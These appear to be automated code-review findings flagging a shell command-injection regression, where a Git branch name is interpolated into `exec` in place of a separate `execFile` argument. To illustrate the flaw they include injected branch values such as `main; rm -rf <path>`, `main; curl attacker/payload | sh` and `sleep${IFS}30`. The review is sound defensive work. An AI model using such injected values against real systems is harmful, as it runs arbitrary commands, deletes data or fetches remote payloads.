findings.title: [P1] Keep the branch name out of the shell command
findings.body: When `branch` contains shell metacharacters, `exec` interprets them instead of passing the value solely to Git. For example, `main; <command>` executes the appended command with the application's privileges. Retain `execFile("git", ["show", branch])` or otherwise avoid invoking a shell.

findings.title: [P2] Preserve the branch as an argv element so cancellation tracks `git`
findings.body:
On POSIX systems, a valid branch name such as `feature&work` is interpreted by the shell as a background command separator. The returned `ChildProcess` tracks the shell, which can exit before the spawned `git` process; callers then cannot reliably await or cancel the actual operation, and the requested branch is not shown.

_Recommend validating this comment independently._

findings.title: [P1] Preserve argument isolation for branch names
findings.body:
`exec` passes the interpolated branch through a shell. Any caller-controlled value such as `main; rm -rf <path>` executes arbitrary commands with the process’s privileges; the previous `execFile` implementation treated the entire value as one Git argument.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell command
findings.body:
`exec` invokes a shell, so an attacker-controlled branch such as `main; curl attacker/payload | sh` executes arbitrary commands with the application’s privileges. The previous `execFile` call treated the branch solely as a Git argument.

_Recommend validating this comment independently._

findings.title: [P2] Avoid shell expansion when executing valid branch names
findings.body:
Git accepts branch names such as `benchmark-change;sleep${IFS}30`. Passing one here executes `sleep 30` after `git show`, keeping a child process and its descriptors alive instead of showing that branch. Similar names can continuously produce output, consuming CPU and buffer memory for every invocation.

_Recommend validating this comment independently._
